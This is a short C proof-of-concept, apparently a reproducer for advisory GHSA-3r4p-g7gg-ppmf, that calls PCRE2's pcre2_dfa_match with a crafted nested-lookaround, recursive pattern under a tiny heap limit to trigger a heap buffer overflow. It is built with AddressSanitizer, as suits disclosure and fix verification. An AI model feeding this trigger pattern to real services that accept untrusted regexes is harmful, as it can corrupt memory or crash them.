/* Residual PoC for the DFA workspace overflow (GHSA-3r4p-g7gg-ppmf).
 *
 * Drives the public PCRE2 API end-to-end: compile a pattern that mixes nested
 * lookaround assertions with a full pattern recursion under a small heap limit,
 * then run it with pcre2_dfa_match(). On a tree where more_workspace() reuses a
 * previously allocated, undersized "next" block without checking its size, the
 * recursion writes its ovector/workspace past the end of that heap block.
 *
 * Build (against the shipped library):
 *   cc -I<build>/interface -fsanitize=address -g -O1 pocs/residual.c \
 *      <build>/libpcre2-8.a -o /tmp/residual
 * Run:
 *   /tmp/residual
 */

#define PCRE2_CODE_UNIT_WIDTH 8
#include <pcre2.h>
#include <stdio.h>
#include <string.h>

int main(void)
{
PCRE2_SPTR pattern =
  (PCRE2_SPTR)"(*LIMIT_HEAP=4)(?=(?=(?=(?=(?=(?=(?=(?=a))(?R))))))).";
PCRE2_SPTR subject = (PCRE2_SPTR)"a";

int errorcode;
PCRE2_SIZE erroroffset;
pcre2_code *re = pcre2_compile(pattern, PCRE2_ZERO_TERMINATED, 0,
  &errorcode, &erroroffset, NULL);

if (re == NULL)
  {
  PCRE2_UCHAR buf[256];
  pcre2_get_error_message(errorcode, buf, sizeof(buf));
  fprintf(stderr, "compile failed at %d: %s\n", (int)erroroffset, buf);
  return 2;
  }

pcre2_match_data *md = pcre2_match_data_create(10, NULL);
int workspace[1000];

int rc = pcre2_dfa_match(re, subject, strlen((const char *)subject), 0, 0,
  md, NULL, workspace, sizeof(workspace)/sizeof(workspace[0]));

printf("pcre2_dfa_match returned %d\n", rc);

pcre2_match_data_free(md);
pcre2_code_free(re);
return 0;
}
